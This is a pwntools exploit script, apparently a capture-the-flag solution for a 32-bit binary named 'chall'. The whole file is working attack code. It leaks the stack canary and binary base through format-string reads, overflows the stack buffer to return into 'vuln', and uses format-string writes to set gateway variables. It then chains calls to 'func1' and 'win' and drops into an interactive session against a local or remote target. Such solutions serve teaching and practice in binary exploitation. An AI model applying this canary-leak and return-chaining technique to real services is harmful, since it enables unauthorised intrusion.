from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 32
context.arch = "i386"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def leak_exe_and_canary(self):
        p = self.p
        self.send(b"%19$p|%3$p|")
        p.recvuntil(b"functions?")
        canary = p.recvuntil(b"|")[:-1]
        exe = p.recvuntil(b"|")[:-1]
        return eval(exe), eval(canary)

    def send(self, content):
        p = self.p
        p.sendline(content)

    def ret2vuln(self):
        pay = flat(
            cyclic(24),
            canary,
            cyclic(12),
            exe.sym['vuln'],
        )
        self.send(pay)
    
    def format_string(self, fmt):
        pay = fmtstr_payload(7, fmt)
        self.send(pay)


def brute(n):
    with context.silent:
        for i in range(1, n):
            x, p = init()
            x.send(f"%{i}$p".encode())
            p.recvuntil(b"functions?")
            print(f"|{i}| {p.recv(20)}")
            p.close()


# brute(500)
"""
address:
    19 canary
    3 exe
"""
x, p = init()
x.debug("break *vuln+100\nc")

exe_leak, canary = x.leak_exe_and_canary()

exe.address = exe_leak - (exe.sym['vuln']+16)

log.info(f"{exe_leak=:x}")
log.info(f"{exe.address=:x}")
log.info(f"{canary=:x}")

x.ret2vuln()
x.format_string({exe.sym['gateway3']: 1})
x.ret2vuln()
x.format_string({exe.sym['gateway2']: 1})

pay = flat(
    cyclic(24),
    canary,
    cyclic(12),
    exe.sym['func1'],
    exe.sym['win'],
    0x1337,
)
x.send(pay)

p.interactive()
